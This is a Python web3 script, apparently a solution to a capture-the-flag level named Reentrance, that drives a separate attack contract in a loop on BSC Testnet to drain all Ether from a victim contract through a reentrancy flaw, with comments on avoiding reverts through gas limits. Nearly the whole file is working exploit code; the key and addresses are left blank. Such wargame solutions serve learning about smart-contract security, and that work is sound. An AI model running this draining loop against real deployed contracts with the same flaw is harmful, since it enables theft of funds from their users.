# The objective here is to drain all the contract funds. The contract has a reentrancy surface
# since the withdraw function sends Ether before updating state. Reffer to the attack contract
# for more details. 

# It is important to note that the real challenge here is to avoid the execution to be reverted
# this can happen either by trying to send more Ether than the victim have or by running out of
# gas. To avoid this last one I had to set a check in the attacking contract for gas left
# and also setting the gas sent manually in the transaction

from web3 import Web3, middleware
from web3.middleware import construct_sign_and_send_raw_middleware
from web3.middleware import geth_poa_middleware # Needed for BSC

# Util library to work with private keys and address
from eth_account import Account

# Library to read the JSONs that contains the contract ABI
import json

# Setting up the account to sign transactions.
main_account = Account.from_key("") #TODO: Include main operator PK
print("Main wallet: " + main_account.address)

# Setting up the provider. For this solution I had to use BSC Testnet
w3Provider = Web3(Web3.HTTPProvider("https://data-seed-prebsc-1-s1.binance.org:8545"))
w3Provider.middleware_onion.inject(geth_poa_middleware, layer=0) # needed for BSC
w3Provider.middleware_onion.add(construct_sign_and_send_raw_middleware(main_account))
w3Provider.eth.default_account = main_account.address

# Gas strategy is a parameter necessary for BSC Testnet
def gas_price_strategy(web3, transaction_params):
    return Web3.toWei(10, 'gwei')

w3Provider.eth.set_gas_price_strategy(gas_price_strategy)
w3Provider.middleware_onion.add(middleware.time_based_cache_middleware)

# We proceed to instance the attacking contract
buildFile = open('artifacts/contracts/ReentrancyAttack.sol/ReentrancyAttack.json', "r")
build = json.loads(buildFile.read())
attackContract = w3Provider.eth.contract(address='', abi=build['abi']) #TODO: Include deployed contract address

# We proceed to instance the victim contract
buildFile = open('../contracts/build/contracts/levels/Reentrance.sol/Reentrance.json', "r")
build = json.loads(buildFile.read())
victimContract = w3Provider.eth.contract(address='', abi=build['abi']) #TODO: Include deployed contract address

# Check contract balance
victimBalance = w3Provider.eth.getBalance(victimContract.address)
print("Victim balance: " + str(victimBalance))
balance = victimContract.functions.balanceOf(attackContract.address).call()
print("Attack contract balance: " + str(balance))


while (victimBalance > 0):

    transaction = attackContract.functions.attack().transact({"value": 1, "gas": 300000}) #TODO: set the value to a multiple of the contract total
    print(w3Provider.eth.wait_for_transaction_receipt(transaction))
    victimBalance = w3Provider.eth.getBalance(victimContract.address)
    print("Victim balance: " + str(victimBalance))

victimBalance = w3Provider.eth.getBalance(victimContract.address)
print("Victim balance: " + str(victimBalance))
balance = victimContract.functions.balanceOf(attackContract.address).call()
print("Attack contract balance: " + str(balance))